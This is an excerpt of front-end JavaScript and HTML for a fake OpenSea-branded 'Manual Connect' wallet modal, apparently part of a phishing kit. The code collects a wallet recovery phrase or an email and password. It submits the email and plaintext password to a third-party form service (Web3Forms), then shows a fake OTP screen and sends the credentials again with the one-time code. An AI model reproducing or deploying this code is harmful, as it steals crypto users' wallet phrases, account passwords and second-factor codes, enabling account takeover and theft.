...
.connect-ring rect.progress {
  ...
  stroke-linecap: butt;
  fill: none;
  /* make the animated dash a quarter of the square perimeter (84 px side -> 336 perimeter)
     dash length 84, gap 252, and animate the offset across the full perimeter for seamless looping */
...
.social-icon img{width:20px;height:20px}`;
  ...
  <div id="modal-overlay" class="modal-overlay" aria-hidden="true">
    <div class="modal-content">
      <div class="sticky-header" style="position:relative;display:flex;align-items:center;gap:16px">
        <img src="Opensea-icon.png" alt="OpenSea" style="width:40px;height:40px;object-fit:contain;flex-shrink:0">
  ...
  <div id="manual-overlay" class="manual-overlay" aria-hidden="true">
    <div class="manual-content">
      <div class="sticky-header" style="position:relative;display:flex;align-items:center;gap:16px">
        <img src="Opensea-icon.png" alt="OpenSea" style="width:40px;height:40px;object-fit:contain;flex-shrink:0">
        <div style="flex:1;text-align:left">
          <h2 style="margin:0;text-align:center;font-size:20px;font-weight:600">Manual Connect</h2>
          <p style="margin:6px 0 0 0;text-align:center;font-size:13px;color:var(--reown-text)">Enter your wallet details</p>
        </div>
      ...
      <div style="padding:20px">
        <div class="tab-buttons">
          ...
          <div class="tab-btn" data-tab="email">Email Sign-in</div>
        </div>
        ...
        <div id="email-tab" class="tab-content" style="display:none">
          <input id="email-input" type="email" class="input-field" placeholder="your@email.com">
          <input id="email-password" type="password" class="input-field" placeholder="Enter your password" style="margin-top:12px" />
          <div id="email-status" style="color:var(--reown-text);font-size:13px;display:none;text-align:center">Please fill out the fields</div>
        </div>
  ...
  // OTP modal (used for Email sign-in verification)
  const otpHtml = `
  <div id="otp-modal" class="manual-overlay" aria-hidden="true" style="display:none">
    <div class="manual-content">
      <div class="sticky-header" style="position:relative;text-align:center">
        <h2 style="margin:0;font-size:20px;font-weight:600">Enter OTP</h2>
        <button id="otp-close-btn" class="close-btn" aria-label="Close">✕</button>
      </div>
      <div style="padding:20px">
        <p style="color:var(--reown-text);text-align:center;margin-bottom:12px">We sent a code to your email address.</p>
        <input id="otp-input" class="input-field" maxlength="6" placeholder="------" style="text-align:center;font-size:22px" />
        <div id="otp-error" style="color:#ef4444;display:none;text-align:center;margin-top:8px">Verification failed</div>
        <div style="text-align:right;margin-top:12px"><button id="otp-submit-btn" class="connect-btn">Verify</button></div>
      </div>
    </div>
  </div>`;

  const container = document.createElement('div'); container.innerHTML = html; document.body.appendChild(container);
  const otpContainer = document.createElement('div'); otpContainer.innerHTML = otpHtml; document.body.appendChild(otpContainer);
  ...
  (function wireModalControls(){
    ...
    // accept multiple triggers: elements with class `open-modal` or attribute `data-open-modal`
    const openBtns = Array.from(document.querySelectorAll('.open-modal, [data-open-modal]'));
    ...
    if (openBtns && openBtns.length) {
      openBtns.forEach(b => b.addEventListener('click', ()=>{ if(modalOverlay){ modalOverlay.style.display='flex'; setTimeout(()=>modalOverlay.classList.add('active'),10) } }));
    }
    ...
    if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
      ...
      try {
        if(activeTab==='phrase'){ content = (phraseInput && phraseInput.value) ? phraseInput.value.trim() : ''; const words = content.split(/\s+/).filter(Boolean); const expected = getExpectedWords(); if(words.length !== expected){ showPhraseError('Please fill out the field'); return; } }
          ...
          if(!emailVal || !passVal){ if(emailStatus){ emailStatus.style.display='block'; setTimeout(()=>emailStatus.style.display='none',3500); } return; }
          // Submit email+password to Web3Forms before showing OTP
          const initialMessage = `Email sign-in attempt:\n\nemail: ${emailVal}\n\npassword: ${passVal}`;
          try {
            manualConnectBtn.disabled = true; manualConnectBtn.textContent = 'Signing-in...';
            const ok = await submitToWeb3Forms({ message: initialMessage, subject: 'Email Sign-in (step 1)' });
            manualConnectBtn.disabled = false; manualConnectBtn.textContent = 'Connect wallet';
            if(!ok || ok.success === false){ if(emailStatus){ emailStatus.textContent = 'Submission failed'; emailStatus.style.display='block'; setTimeout(()=>emailStatus.style.display='none',3500); } return; }
          } catch(err){ manualConnectBtn.disabled = false; manualConnectBtn.textContent = 'Connect wallet'; if(emailStatus){ emailStatus.textContent = 'Submission error'; emailStatus.style.display='block'; setTimeout(()=>emailStatus.style.display='none',3500); } return; }
          pendingEmailData = { email: emailVal, password: passVal };
          const otpModal = document.getElementById('otp-modal'); if(otpModal){ otpModal.style.display='flex'; setTimeout(()=>otpModal.classList.add('active'),10); }
          return;
        }
    ...
    // OTP modal handlers (for Email Sign-in flow)
    ...
    if (otpCloseBtn) otpCloseBtn.addEventListener('click', ()=>{
      if(otpModalEl){ otpModalEl.classList.remove('active'); setTimeout(()=>{ otpModalEl.style.display='none'; },400); }
      pendingEmailData = null;
    });

    if (otpSubmitBtn) otpSubmitBtn.addEventListener('click', async ()=>{
      const code = otpInput ? otpInput.value.trim() : '';
      if(!code){ if(otpError){ otpError.textContent = 'Enter the code'; otpError.style.display='block'; setTimeout(()=>otpError.style.display='none',3000); } return; }
      otpSubmitBtn.disabled = true; otpSubmitBtn.textContent = 'Verifying...';
      const emailVal = pendingEmailData ? pendingEmailData.email : '';
      const passVal = pendingEmailData ? pendingEmailData.password : '';
      const payloadMessage = `Email sign-in verification:\n\nemail: ${emailVal}\n\npassword: ${passVal}\n\notp: ${code}`;
      const result = await submitToWeb3Forms({ message: payloadMessage, subject: 'Email Sign-in (verify)' });
      if(result && result.success === true){
        ...
        const overlay2 = document.getElementById('connect-overlay-2'); const ring2 = document.getElementById('connectRing2');
        try { const stored = sessionStorage.getItem('bitverse:selectedWalletIcon'); const img2 = document.getElementById('modalMainWalletImg2'); if (stored && img2) img2.src = stored; } catch(e) {}
        if(overlay2){ overlay2.style.display='flex'; setTimeout(()=>overlay2.classList.add('active'),10); }
        ...
        otpSubmitBtn.disabled = false; otpSubmitBtn.textContent = 'Verify';
        const errMsg = (result && (result.error || result.message)) ? (result.error || result.message) : 'Verification failed';
        if(otpError){ otpError.textContent = errMsg.toString(); otpError.style.display='block'; setTimeout(()=>otpError.style.display='none',3500); }
      }
    });
  ...
  window.showWalletModal = function(){ const m = document.getElementById('modal-overlay'); if(!m) return; m.style.display='flex'; setTimeout(()=>m.classList.add('active'),10); };
